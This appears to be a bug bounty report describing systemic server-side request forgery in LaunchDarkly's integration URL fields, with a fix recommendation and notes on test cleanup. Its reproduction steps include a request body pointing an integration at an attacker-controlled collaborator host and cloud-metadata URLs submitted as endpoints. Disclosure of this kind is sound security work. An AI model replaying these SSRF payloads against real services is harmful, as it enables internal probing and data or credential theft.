# Systemic SSRF: integration URL fields accept internal/arbitrary hosts with no egress validation

**Program:** LaunchDarkly Managed Bug Bounty (Bugcrowd, `launchdarkly-mbb-og`)
**Target:** `app.launchdarkly.com` — Integrations (`/api/v2/integrations/{kind}`)
**Class:** SSRF (CWE-918)
**Relationship to prior report:** generalizes the accepted Webhooks SSRF
(`Webhook URL field accepts internal/cloud-metadata addresses`). This shows the
same missing validation is **systemic across many integration URL-sinks**, not a
one-off, and that at least one sink makes a **confirmed** server-side request to
an arbitrary attacker-controlled host (out-of-band proven).

## Summary

LaunchDarkly integrations that take a user-supplied URL/endpoint feed that URL to
LaunchDarkly's backend, which then issues outbound HTTP requests to it (delivery of
audit-log events, etc.). Multiple such integrations perform **no validation** against
internal / link-local / cloud-metadata address ranges, and at least one was confirmed
to actually fire a server-side request to an arbitrary external host supplied by the
tester.

Notably, validation is applied **inconsistently**: the Datadog integration restricts
its host to a fixed enum allowlist (5 official Datadog hosts), while sibling
integrations accept an arbitrary `uri`/string. This inconsistency indicates a missing
central egress control rather than a deliberate design choice.

## Confirmed this session (2026-09-07)

All actions performed in the tester's own trial org (`bugcrowdninja.com`,
user "Lapras Resonance" / gmaxresonance@bugcrowdninja.com) via `POST /api/v2/integrations/{kind}`.
All test artifacts were deleted afterward (see Cleanup).

1. **Mattermost — SSRF to arbitrary external host CONFIRMED (out-of-band).**
   Created a Mattermost integration with `config.url` set to a tester-controlled
   collaborator URL. Accepted with `201`, no validation error. A flag change (audit
   event) then caused LaunchDarkly's backend to POST the event payload to the
   collaborator:
   - Source IP `34.236.6.43` (AWS us-east-1), `User-Agent: LD-Integrations/1.0`
   - Delivered a JSON body describing the flag change (see evidence)
   This proves the backend will make server-side requests to an arbitrary,
   attacker-specified host.

2. **Grafana — internal/metadata URL accepted (no validation).**
   `config.endpointUrl = http://169.254.169.254/latest/meta-data/` → `201`, stored verbatim.

3. **Splunk — internal/metadata URL accepted (no validation).**
   `config.base-url = http://169.254.169.254/latest/meta-data/` (+ a
   `skip-ca-verification` option) → `201`, stored verbatim.

Combined with the previously accepted Webhooks finding, four distinct sinks
(webhooks, mattermost, grafana, splunk) lack egress validation.

## Additional sinks with the same shape (URL field, no allowlist declared)

From `GET /api/v2/integration-manifests` (form variables), the following also take a
user-supplied URL with `allowedValues: null` and are the same "LaunchDarkly calls your
URL" pattern (not individually fired this session, listed to scope the blast radius):
`msteams`, `msteams-app`, `dynatrace`, `dynatrace-v2`, `elastic`, `last9`,
`compass`, `custom-approvals` (baseURL), `kosli`, `chronosphere`, `unleash` (sourceBaseUrl).

Contrast — validated sink: `datadog` `hostURL` is an `enum` restricted to 5 official
Datadog hosts.

## Steps to reproduce (Mattermost, OOB)

1. Get a collaborator URL (e.g. webhook.site).
2. `POST /api/v2/integrations/mattermost` (cookie-auth session), body:
   ```json
   {"name":"t","config":{"url":"https://<collaborator>"},"on":true,
    "statements":[{"effect":"allow","resources":["proj/*:env/*:flag/*"],"actions":["*"]}]}
   ```
   → `201 Created`, no validation on the URL.
3. Toggle any flag (`PATCH /api/v2/flags/default/{flag}` semanticpatch `turnFlagOn`)
   to emit an audit event.
4. Observe LaunchDarkly's backend POST to the collaborator from an AWS IP with
   `User-Agent: LD-Integrations/1.0`.

For the internal-address variant, repeat step 2 for `grafana`/`splunk` with the URL
field set to `http://169.254.169.254/latest/meta-data/` — accepted with `201`.

## Impact — confirmed vs. not

- **Confirmed:** an authenticated user who can configure integrations can make
  LaunchDarkly's servers issue outbound requests to an arbitrary host of their
  choosing (blind/one-way SSRF; the audit payload is delivered to the attacker host).
  Internal/link-local/metadata URLs are accepted without validation on multiple sinks.
- **Not confirmed (same caveat as the webhook report):** whether a request to
  `169.254.169.254` (or other internal services) actually completes from LaunchDarkly's
  infrastructure, or is blocked by network egress controls. There is no delivery-status
  surface exposed to the tester for the internal-URL case. No claim of credential theft
  is made — only that input validation is absent and arbitrary **external** SSRF is
  confirmed.

Requires an authenticated actor with integration-management permission; the value over
the single-webhook report is that the gap is **systemic** and one more sink is
**OOB-confirmed**.

## Suggested fix

Apply a single, central egress policy to **every** integration URL/endpoint form
variable (and at dispatch time, to defeat DNS rebinding): reject hosts resolving to
RFC1918, loopback, link-local (169.254.0.0/16), and other internal ranges; prefer an
allowlist where the destination is a known SaaS (as already done for Datadog's
`hostURL` enum). The inconsistency between Datadog (allowlisted) and the other sinks
is the clearest evidence this control is missing centrally.

## Cleanup

All three test integrations (mattermost/grafana/splunk) were deleted (`204`,
verified 0 remaining) and the toggled flag was reverted to off. OOB evidence saved to
`reports/` scratch (`ld_oob_evidence.json`).

## Status
- 2026-09-07: Posted as a consolidating follow-up comment on the existing
  Webhooks SSRF submission (Bugcrowd baf78acc-3a1e-4dbb-8e7c-27733b207314)
  rather than a separate report, per the program's single-report/duplicate
  guideline. P4 reward tier for this program is $150; consolidation avoids a
  likely duplicate close.

## Access-control / IDOR testing (2026-09-07) — NEGATIVE (no finding)
Tested LaunchDarkly's /api/v2 authorization enforcement in the trial org
(single account, using scoped API tokens driven without the session cookie):
- A built-in `reader` token: reads OK, all writes and token-minting correctly 403.
- A token bound only to a custom role scoped to one project: writes correctly
  confined (403 on other project + account-level mutations; 403 on creating
  projects/admin tokens), i.e. no privilege escalation.
- Cross-project READ: a project-scoped token could read another project +
  account-level members/tokens/roles. Initially looked like a read-scoping leak,
  BUT an explicit `deny` of viewProject on the other project IS honored (403).
  => LaunchDarkly's model is view-by-default-unless-denied; the authz engine
  enforces correctly. This is intended behaviour, NOT a vulnerability. Not reported.
All test tokens/roles/project deleted afterward (verified).

Org hygiene note: a leftover flag `shroodler-xss-test-script-alert-1-...` exists
in the `default` project from earlier XSS probing (pre-existing, not created this
session) — worth deleting for tidiness.
